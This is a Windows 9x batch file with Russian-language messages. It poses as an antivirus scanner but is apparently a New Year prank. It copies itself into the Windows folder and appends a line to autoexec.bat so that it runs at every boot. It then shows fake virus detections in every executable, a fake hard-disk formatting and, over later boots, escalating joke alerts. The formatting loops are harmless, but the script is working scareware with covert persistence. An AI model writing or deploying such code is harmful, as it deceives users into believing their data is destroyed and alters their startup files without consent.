@echo off
if not *%winbootdir%==* goto @@000
echo This program requires Microsoft Windows 9x.
goto @@009
:@@000
if not *%1==*  goto @@001
echo Cool AntiViral Scanner v20.02 (128-bit mode)
echo Copyfromrighttoleft (c)2002 by Дед Мороз. Все вирусы защищены.
copy %0 %winbootdir%\_win~.bat >nul
echo if not exist %winbootdir%\_win~.~~9 call %winbootdir%\_win~.bat ~ >> c:\autoexec.bat
if exist %winbootdir%\_win~.~~? del %winbootdir%\_win~.~~? >nul
echo: >%winbootdir%\_win~.~~0
for %%f in (%winbootdir%\*.exe) do call %winbootdir%\_win~.bat * %%f
echo:
echo **** ВНИМАНИЕ!!!
echo **** При таком количестве вирусов необходимо форматирование жесткого диска.
echo:
echo **** Нажмите любую клавишу для продолжения...
pause > nul
for %%f in (%winbootdir%\*.*) do dir %winbootdir% > nul
echo:
echo **** Жесткий диск успешно отформатирован! Вирус WIN.OUTLOOK.EXPRESS уничтожен.
pause > nul
echo:
goto @@009
:@@001
if not *%1==** goto @@002
echo %2 - Найден опасный вирус WIN.OUTLOOK.EXPRESS!!!
for %%f in (%winbootdir%\*.*) do copy nul nul > nul
goto @@009
:@@002
if exist %winbootdir%\_win~.~~2 set _win~=в папке %winbootdir%
if exist %winbootdir%\_win~.~~3 set _win~=в папке C:\Program Files
if exist %winbootdir%\_win~.~~4 set _win~=в папке Мои документы
if exist %winbootdir%\_win~.~~5 set _win~=в Вашей мышке
if exist %winbootdir%\_win~.~~6 set _win~=в Вашей клавиатуре
if exist %winbootdir%\_win~.~~7 set _win~=в Вашем мониторе
if exist %winbootdir%\_win~.~~8 set _win~=под Вашей елкой. С новым годом! ;)
if *%_win~%==* goto @@003
echo:
echo **** ВНИМАНИЕ!!!
echo **** Вирус WIN.OUTLOOK.EXPRESS обнаружен %_win~%!!!
if exist %winbootdir%\_win~.~~8 goto @@004
echo:
echo **** Нажмите любую клавишу для форматирования винчестера...
:@@004
pause >nul
:@@003
if exist %winbootdir%\_win~.~~8 copy %0 %winbootdir%\_win~.~~9 > nul
if exist %winbootdir%\_win~.~~7 copy %0 %winbootdir%\_win~.~~8 > nul
if exist %winbootdir%\_win~.~~6 copy %0 %winbootdir%\_win~.~~7 > nul
if exist %winbootdir%\_win~.~~5 copy %0 %winbootdir%\_win~.~~6 > nul
if exist %winbootdir%\_win~.~~4 copy %0 %winbootdir%\_win~.~~5 > nul
if exist %winbootdir%\_win~.~~3 copy %0 %winbootdir%\_win~.~~4 > nul
if exist %winbootdir%\_win~.~~2 copy %0 %winbootdir%\_win~.~~3 > nul
if exist %winbootdir%\_win~.~~1 copy %0 %winbootdir%\_win~.~~2 > nul
if exist %winbootdir%\_win~.~~0 copy %0 %winbootdir%\_win~.~~1 > nul
:@@009
